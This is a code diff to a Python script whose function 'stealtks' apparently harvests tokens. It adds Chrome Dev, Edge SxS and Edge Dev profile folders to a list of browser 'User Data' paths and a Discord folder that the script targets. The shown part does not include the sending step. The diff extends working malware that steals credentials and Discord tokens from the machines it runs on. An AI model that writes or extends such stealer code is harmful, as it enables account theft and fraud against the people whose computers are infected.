@@ -262,7 +262,8 @@ def stealtks():
     '0Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
     '0ChromeSxS': os.path.join(local, 'Google', 'Chrome SxS', 'User Data'),
     '0Comet': os.path.join(local, 'Comet', 'User Data'),
-    '0ChromeBeta': os.path.join(local, 'Google', 'Chrome Beta', 'User Data').
+    '0ChromeBeta': os.path.join(local, 'Google', 'Chrome Beta', 'User Data'),
+    '0ChromeDev': os.path.join(local, 'Google', 'Chrome Dev', 'User Data'),
     '0Amigo': os.path.join(local, 'Amigo', 'User Data'),
     '0Avast': os.path.join(local, 'AVAST Software', 'Browser', 'User Data'),
     '0Chromium': os.path.join(local, 'Chromium', 'User Data'),
@@ -278,6 +279,8 @@ def stealtks():
     '0Vivaldi': os.path.join(local, 'Vivaldi', 'User Data'),
     '0Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data'),
     '0Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
+    '0EdgeSxS': os.path.join(local, 'Microsoft', 'Edge SxS', 'User Data'),
+    '0EdgeDev': os.path.join(local, 'Microsoft', 'Edge Dev', 'User Data'),
     '0Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
     '0Vivaldi': os.path.join(local, 'Vivaldi', 'User Data'),
     '1Discord': os.path.join(roaming, 'discord'),
@@ -402,6 +405,7 @@ def main():
         
 
 main()
+
 
 
 
